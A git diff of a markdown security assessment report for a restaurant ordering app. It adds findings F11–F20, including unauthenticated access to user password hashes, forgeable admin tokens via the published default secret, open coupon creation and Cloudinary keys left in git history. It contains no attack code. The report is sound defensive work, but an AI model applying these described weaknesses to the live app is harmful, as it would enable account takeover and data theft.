+| Old `.env` with `SECRET=MySecret1!` and a MongoDB password (F10) | Yes | **No**: the values are too simple for its rules |
+| Cloudinary keys in `cloudinary.config.js` (F20) | **No**: I only checked the `.env` file | Yes |
+
+In test 3f I wrote that the Cloudinary values in the old `.env` were placeholders. That is true for that file, but the real keys were in another file. Neither method alone found both leaks.
+
+**For the pipeline (issue #13):** run gitleaks on every push, so a key is caught the day it is committed. Test tokens in evidence files go on an allowlist, with the reason.
 
 ## Step 9: Report
 
@@ -641,6 +1194,16 @@ A finding is a suspicion that a real request has proved. Each one links to the s
 | F5 | Weak passwords are accepted: `Password1`, `Qwerty123`, `Restauranty1`. | Medium | A07 Authentication Failures | [Test 3b](#test-3b-how-weak-can-a-password-be) |
 | F6 | No limit on login attempts: about 10 guesses per second, no blocking, no slowdown. | High | A07 Authentication Failures | [Test 3c](#test-3c-can-i-guess-passwords-without-limit) |
 | F7 | Logout does not end the session: a copied token works for its full 6 hours after logout. | Medium | A07 Authentication Failures | [Test 3d](#test-3d-does-logout-really-log-you-out) |
-| F8 | A refused token is answered with "500 server error" instead of "401 not allowed". Attacks look like outages. | Medium | A10 Mishandling of Exceptional Conditions | [Test 3e](#test-3e-can-i-change-the-token-myself) |
+| F8 | A missing, broken or tampered token is answered with "500 server error" instead of "401 not allowed", with 11 to 17 log lines each. Attacks look like outages. | Medium | A10 Mishandling of Exceptional Conditions | [Test 3e](#test-3e-can-i-change-the-token-myself), [Test 7a](#test-7a-what-happens-with-no-token-or-a-broken-one) |
 | F9 | The server signs and checks tokens with one secret (HS256), and runs with `MySecret1!`, the value published in `.env.example` and the README. With it, anyone can make an admin token for any user, even one that does not exist. The app never complains about the default. | High | A02 Security Misconfiguration, A04 Cryptographic Failures | [Test 3f](#test-3f-can-i-make-my-own-token-from-nothing) |
 | F10 | Real config files (`.env`) were committed in April 2025 and are still in the git history, including a MongoDB username and password (for `localhost`). | Low | A02 Security Misconfiguration | [Test 3f](#test-3f-can-i-make-my-own-token-from-nothing) |
+| F11 | Anyone can list all users, or look up one user by ID, without logging in: password hashes, emails, addresses, phones, roles. Offline, 4 of 5 test passwords were recovered from the hashes in 3.4 seconds. | High | A01 Broken Access Control | [Test 4a](#test-4a-what-can-a-stranger-read), [Test 5b](#test-5b-does-looking-up-one-user-leak-the-hash) |
+| F12 | Anyone can read all items, dietary categories, orders, coupons and campaigns without logging in. | Medium | A01 Broken Access Control | [Test 4a](#test-4a-what-can-a-stranger-read) |
+| F13 | Anyone can create, change and delete coupons, campaigns, items, dietary categories and orders without logging in. None of these routes checks a token (step 1); proved with a request by creating a 100% coupon valid until 2099. | High | A01 Broken Access Control | [Test 4b](#test-4b-what-can-a-stranger-change-or-delete) |
+| F14 | Anyone can delete any user without logging in. The answer also returns the deleted user's password hash and personal data. | High | A01 Broken Access Control | [Test 4b](#test-4b-what-can-a-stranger-change-or-delete) |
+| F15 | Logged-in users also get every user's password hash. Since anyone can sign up, a token check would not help; a Gateway block only hides the route, the auth service still sends the hashes. | High | A01 Broken Access Control | [Test 5a](#test-5a-does-a-logged-in-user-also-get-other-users-hashes) |
+| F16 | Coupons accept any discount (-50, 1000, "lots") and an end date before the start date. The discount is stored as free text and never checked. | Medium | A06 Insecure Design | [Test 6a](#test-6a-does-the-app-check-what-a-discount-can-be) |
+| F17 | Error answers contain the raw database error: MongoDB, Mongoose, model names, field names and rules. The same line sends them in 32 places. | Low | A10 Mishandling of Exceptional Conditions | [Test 7b](#test-7b-what-do-errors-tell-an-attacker) |
+| F18 | Request metrics are labelled with the full URL. 200 junk requests created 201 new counters: an attacker can overload Prometheus and blind the monitoring. | Medium | A06 Insecure Design | [Test 7c](#test-7c-can-junk-requests-fill-up-the-monitoring) |
+| F19 | Outdated packages: the frontend has 36 known issues, mostly in build tools (0 critical), and `react-router` needs a major upgrade. The backends' issues are only in the development tool `nodemon`. | Low | A03 Software Supply Chain Failures | [Test 8a](#test-8a-npm-audit-known-vulnerable-packages) |
+| F20 | Cloudinary credentials (API key and secret) were written into the code in the first commit (April 2025). Removed in June 2025, but still in the public git history. They look real. Not tried; the owner should rotate them. | High | A07 Authentication Failures | [Test 8c](#test-8c-gitleaks-secrets-in-the-git-history) |
